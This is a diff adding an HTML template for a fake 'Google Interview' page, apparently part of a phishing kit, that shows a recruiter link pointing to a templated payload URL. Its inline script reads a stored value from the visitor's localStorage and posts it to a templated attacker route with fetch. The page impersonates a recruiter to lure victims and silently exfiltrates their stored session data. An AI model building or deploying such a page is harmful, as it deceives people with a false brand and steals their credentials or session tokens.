@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Interview</title>
+</head>
+<body>
+    <a href="<%= PAYLOAD %>">Click here to talk to a recruiter</a>
+    <div id="cookieName" data-name="<%= COOKIE_NAME %>"></div>
+    <div id="payloadRoute" data-route="<%= PAYLOAD_ROUTE %>"></div>
+    <script>
+        const cookie_name = document.getElementById("cookieName").dataset.name;
+        const payloadRoute = document.getElementById("payloadRoute").dataset.route;
+        // look for cookie
+        if (typeof(Storage) !== "undefined") {
+            let cookie = window.localStorage[cookie_name];
+            if (cookie != undefined && cookie != null) {
+                const uri = new URL(payloadRoute);
+                uri.search = new URLSearchParams({cookie: cookie}).toString();
+                fetch(uri, {method: 'POST'})
+            }
+        }
+    </script>
+</body>
+</html>
